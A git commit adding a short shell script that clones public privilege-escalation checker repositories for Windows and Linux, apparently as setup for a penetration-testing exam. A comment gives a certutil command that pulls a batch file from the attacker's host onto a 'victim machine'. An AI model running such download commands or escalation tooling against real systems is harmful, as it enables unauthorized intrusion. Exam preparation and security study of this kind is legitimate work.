19f435fd426da4f4998db8c7cf6b03589c7a6078
David Grandolfo <39743735+DaGrand@users.noreply.github.com>
2025-04-07 16:03:22 -0400

    Create Connect-GitHubForExam.sh

---
+++ Connect-GitHubForExam.sh
@@ -0,0 +1,29 @@
+######################################
+############## WINDOWS ###############
+######################################
+
+### Auto Windows Privilege Escalation Checker ###
+# 1. cd WinPrivChecker
+# 2. sudo chmod +x wincheck #
+# 3. sudo cp wincheck /usr/local/bin
+git clone https://github.com/RajChowdhury240/WinPrivChecker.git
+
+### The script represents a conglomeration of various privilege escalation checks, gathered from various sources ###
+# 1. Copy the batch file from your attacker machine to a user writeable directory on the victim machine
+# 2. Type on the target machine: certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat
+
+git clone https://github.com/Tib3rius/windowsprivchecker
+
+######################################
+##############  LINUX  ###############
+######################################
+
+### Linux - Privilege Escalation ###
+# 1. OSCP CheatSheet
+
+git clone https://github.com/RajChowdhury240/OSCP-CheatSheet/tree/main
+
+
+### Linux Priv Escalation Check Scripts ###
+
+git clone https://github.com/sleventyeleven/linuxprivchecker
